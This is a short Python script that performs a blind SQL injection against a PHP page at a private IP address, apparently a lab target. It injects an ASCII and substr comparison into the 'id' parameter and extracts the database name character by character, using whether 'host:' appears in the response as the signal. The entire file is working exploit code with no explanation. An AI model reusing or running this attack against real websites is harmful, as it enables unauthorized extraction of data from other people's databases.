#coding=utf-8
import requests
import re

db=""
for k in range(1,9):
    for i in range(32,126):
        ks=str(k)
        s=str(i)
        url="http://192.168.1.106/t1.php?id=1' and ascii(substr(database(),%s,1))=%s --+" %(ks,s)
        print('payloads -> ',url)
        r=requests.get(url=url)
        order_num=re.findall(r"host:",r.text)
        if(len(order_num)):
            db=db+chr(i)
            print (db)
            break

